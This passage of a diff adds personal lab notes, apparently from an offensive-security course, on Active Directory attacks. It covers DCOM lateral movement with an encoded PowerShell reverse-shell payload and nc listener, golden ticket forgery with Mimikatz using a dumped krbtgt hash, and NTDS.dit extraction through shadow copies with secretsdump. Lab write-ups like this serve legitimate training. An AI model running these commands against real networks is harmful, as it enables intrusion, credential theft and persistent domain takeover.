@@ -2670,9 +2670,63 @@ HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"`
   - Accessing the shared folder through the injected ticket  
     `PS C:\Tools> ls \\web04\backup`  
 - DCOM
+  - Loggined in to client74 as 'jen', From an elevated PowerShell prompt  
+  - Remotely Instantiating the MMC Application object (target IP of FILES04)  
+    `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))`  
+  - Executing a command on the remote DCOM object  
+    `$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")`
+  - Verifying that calculator is running on FILES04  
+    `C:\Users\Administrator>tasklist | findstr "calc"`  
+  - Adding a reverse-shell as a DCOM payload on CLIENT74  
+    `$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
+AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
+  - Obtaining a reverse-shell through DCOM lateral movement (FILES04)  
+    `kali@kali:~$ nc -lnvp 443`
 - Golden Ticket
+  - Dump krbtgt hash → 2. Forge TGT for any user → 3. Inject ticket → 4. Access resources → 5. Maintain persistent domain-admin-level access  
+  - krbtgt:  password hash of a domain user account
+  - golden ticket: if we got krbtgt password hash, can create own self-made custom TGTs
+  - move from the Windows 11 CLIENT74 workstation to the domain controller via PsExec (failed because of permission)
+    `C:\Tools\SysinternalsSuite>PsExec64.exe \\DC1 cmd.exe`
+  - need a compromised domain controller then can extract hash of the krbtgt account with Mimikatz.
+  - **Log in to the domain controller with remote desktop using the jeffadmin** account > CORP / S-1-5-21-1987370270-658905905-1781884369; user: krbtgt, NTLM 1693c6cefafffc7af11ef34d1c788f47  
+    ```
+    mimikatz # privilege::debug
+    mimikatz # lsadump::lsa /patch
+    ```
+  - **move back to CLIENT74 as the jen user**
+  - Purging existing Kerberos Tickets
+    `mimikatz # kerberos::purge`
+  - Creating a golden ticket using Mimikatz > User Id : 500  
+    ```
+    mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+    ...
+    Golden ticket for 'jen @ corp.com' successfully submitted for current session
+    
+    mimikatz # misc::cmd
+    ```
+  - launch a new command prompt with misc::cmd to access DC01  
+    `C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe`  
+    `C:\Windows\system32>ipconfig`
+  - verify jen is now part of the Domain Admin group > CORP\Domain Admins  
+    `C:\Windows\system32>whoami /groups`
+  - FYI: Use of NTLM authentication blocks our access  
+    `C:\Tools\SysinternalsSuite> psexec.exe \\192.168.50.70 cmd.exe` //Access is denied.  
 - Shadow Copies
-  
+  - A Shadow Copy, also known as Volume Shadow Service (VSS) is a Microsoft backup technology that allows the creation of snapshots of files or entire volumes. Allow us to extract the Active Directory Database NTDS.dit database file.  
+  - connect as the **jeffadmin** domain admin user to the **DC1** domain controller.  
+  - Performing a Shadow Copy of the entire C: drive > Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2  
+    `C:\Tools>vshadow.exe -nw -p  C:`
+  - Copying the ntds database to the C: drive  
+    `C:\Tools>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak`  
+  - Copying the ntds database to the C: drive  
+    `C:\>reg.exe save hklm\system c:\system.bak`  
+  - Moved 2 .bak files to kali machine  
+  - Use secretsdump to extract credentials  
+    `kali@kali:~$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL`  
+    impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL  
+  - we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user, using the DC sync method  
+
 ### 25. Enumerating AWS Cloud Infrastruture
 ### 26. Attacking AWS cloud infrastruture 
 ### 27. Assembling the pieces
